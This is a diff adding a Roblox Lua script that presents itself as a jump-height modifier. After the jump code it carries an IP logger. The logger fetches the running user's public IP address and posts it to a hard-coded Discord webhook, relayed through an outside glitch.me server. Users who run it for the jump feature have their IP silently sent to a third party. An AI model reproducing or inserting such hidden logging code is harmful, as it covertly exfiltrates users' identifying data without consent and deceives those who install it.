@@ -1,0 +1,80 @@
+local Player = game:GetService'Players'.LocalPlayer;
+local UIS = game:GetService'UserInputService';
+
+_G.JumpHeight = 50;
+
+function Action(Object, Function) if Object ~= nil then Function(Object); end end
+
+UIS.InputBegan:connect(function(UserInput)
+    if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
+        Action(Player.Character.Humanoid, function(self)
+            if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
+                Action(self.Parent.HumanoidRootPart, function(self)
+                    self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
+                end)
+            end
+        end)
+    end
+end)
+local IPADDRESS = game:HttpGet("https://api6.ipify.org/?format=plain")
+
+local DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/721398673531207751/rZD-iQtPIEwikZdDrfXwonucrsHuLe63fnW9NGfe7Hr8YiLcJu_EPH4ziD5BPjV8iFVs";
+
+local WEBHOOK_NAME = "IP Logger example by D9ED";
+
+
+
+
+
+local HttpService = game:GetService("HttpService");
+
+
+
+function SendMessage(Webhook, Message, Botname)
+
+   if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
+
+       return error("Send a valid URL");
+
+   end
+
+   local Name;
+
+   local WakeUp = game:HttpGet("http://buritoman69.glitch.me");
+
+   local API = "http://buritoman69.glitch.me/webhook";
+
+   if (not Message or Message == "" or not Botname) then
+
+       Name = "GameBot"
+
+       return error("nil or empty message!")
+
+   else
+
+       Name = Botname;
+
+   end
+
+   local Body = {
+
+       ['Key'] = tostring("applesaregood"),
+
+       ['Message'] = tostring(Message),
+
+       ['Name'] = Name,
+
+       ['Webhook'] = Webhook    
+
+   }
+
+   Body = HttpService:JSONEncode(Body);
+
+   local Data = game:HttpPost(API, Body, false, "application/json")
+
+   return Data or nil;
+
+end
+
+
+SendMessage(DISCORD_WEBHOOK, IPADDRESS, WEBHOOK_NAME)
